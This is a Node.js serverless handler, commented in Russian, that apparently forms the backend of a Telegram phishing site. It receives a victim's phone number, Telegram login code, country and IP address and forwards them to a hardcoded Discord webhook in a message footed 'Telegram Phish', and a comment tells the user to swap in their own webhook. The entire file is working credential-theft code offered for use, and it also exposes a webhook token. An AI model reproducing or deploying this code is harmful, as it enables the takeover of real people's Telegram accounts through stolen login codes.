// Если используете CommonJS (по умолчанию для Vercel)
module.exports = async (req, res) => {
    // Разрешаем только POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { phone, code, country } = req.body;

    // Проверка наличия данных
    if (!phone || !code) {
        return res.status(400).json({ error: 'Missing data' });
    }

    // IP адрес жертвы (если прокси нет)
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Твой Discord webhook URL (замени на свой)
    const webhookUrl = 'https://discord.com/api/webhooks/1456608509906128928/S_vlv9faEH_Y2RLDAfJA07eZ8DvZG_QiojDILZpg0xTk60b0n7QrlL4e8N2874Dt5nVK';

    const embed = {
        embeds: [
            {
                title: '🔥 НОВЫЙ ЛОГ',
                color: 0x2AABEE,
                fields: [
                    { name: '📱 Телефон', value: phone, inline: true },
                    { name: '🔑 Код', value: code, inline: true },
                    { name: '🌍 Страна', value: country || 'Неизвестно', inline: true },
                    { name: '🖥 IP', value: ip || 'Неизвестно', inline: false }
                ],
                timestamp: new Date().toISOString(),
                footer: { text: 'Telegram Phish' }
            }
        ]
    };

    try {
        const fetch = require('node-fetch'); // Vercel включает node-fetch по умолчанию, но на всякий случай
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(embed)
        });
        res.status(200).json({ success: true });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Failed to send to Discord' });
    }
};
